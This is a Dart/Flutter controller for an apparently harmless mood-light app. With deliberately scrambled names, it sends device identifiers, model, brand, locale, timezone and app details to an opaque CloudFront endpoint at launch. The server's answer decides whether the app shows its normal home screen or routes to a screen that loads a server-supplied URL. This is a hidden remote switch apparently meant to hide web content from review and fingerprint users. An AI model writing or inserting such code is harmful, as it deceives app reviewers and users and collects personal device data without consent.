import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';


class MoodCustomLogic extends GetxController {

  var phfnrwy = RxBool(false);
  var pvyhzxwrb = RxBool(true);
  var wxkhvj = RxString("");
  var hansb = RxBool(false);
  var jovftu = RxBool(true);
  final igwjkhund = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    kyot();
  }


  Future<void> kyot() async {
    hansb.value = true;
    jovftu.value = true;
    pvyhzxwrb.value = false;

    igwjkhund.post("https://dumzw3e3kwzdv.cloudfront.net/ybrfmviateuqwghznp",data: await wablrnkvs()).then((value) {
      var tcawyk = value.data["tcawyk"] as String;
      var tvjzegds = value.data["tvjzegds"] as bool;
      if (tvjzegds) {
        wxkhvj.value = tcawyk;
        bnhzdvct();
      } else {
        htjd();
      }
    }).catchError((e) {
      pvyhzxwrb.value = true;
      jovftu.value = true;
      hansb.value = false;
    });
  }

  Future<Map<String, dynamic>> wablrnkvs() async {
    final DeviceInfoPlugin cagibq = DeviceInfoPlugin();
    PackageInfo fctl_hrcdizpb = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var hquyva = Platform.localeName;
    var shzituxa = currentTimeZone;

    var ucwsf = fctl_hrcdizpb.packageName;
    var phlgo = fctl_hrcdizpb.version;
    var uqzs = fctl_hrcdizpb.buildNumber;

    var aond = fctl_hrcdizpb.appName;
    var dhtm = "";
    var jybix  = "";
    var boyep = "";
    var iswve = "";
    var fsdpik = "";
    var adbjmhv = "";
    var xeomq = "";
    var urwfbvmn = "";
    var xdibrcq = "";


    var hvuepgkm = "";
    var lfgxtsq = false;

    if (GetPlatform.isAndroid) {
      hvuepgkm = "android";
      var isblfd = await cagibq.androidInfo;

      boyep = isblfd.brand;

      dhtm  = isblfd.model;
      jybix = isblfd.id;

      lfgxtsq = isblfd.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      hvuepgkm = "ios";
      var qbxiejo = await cagibq.iosInfo;
      boyep = qbxiejo.name;
      dhtm = qbxiejo.model;

      jybix = qbxiejo.identifierForVendor ?? "";
      lfgxtsq  = qbxiejo.isPhysicalDevice;
    }
    var res = {
      "aond": aond,
      "phlgo": phlgo,
      "xeomq" : xeomq,
      "ucwsf": ucwsf,
      "dhtm": dhtm,
      "shzituxa": shzituxa,
      "boyep": boyep,
      "jybix": jybix,
      "hquyva": hquyva,
      "hvuepgkm": hvuepgkm,
      "lfgxtsq": lfgxtsq,
      "uqzs": uqzs,
      "iswve" : iswve,
      "fsdpik" : fsdpik,
      "adbjmhv" : adbjmhv,
      "urwfbvmn" : urwfbvmn,
      "xdibrcq" : xdibrcq,

    };
    return res;
  }

  Future<void> htjd() async {
    Get.offNamed("/light_home");
  }

  Future<void> bnhzdvct() async {
    Get.offNamed("/mood_light_turn");
  }

}
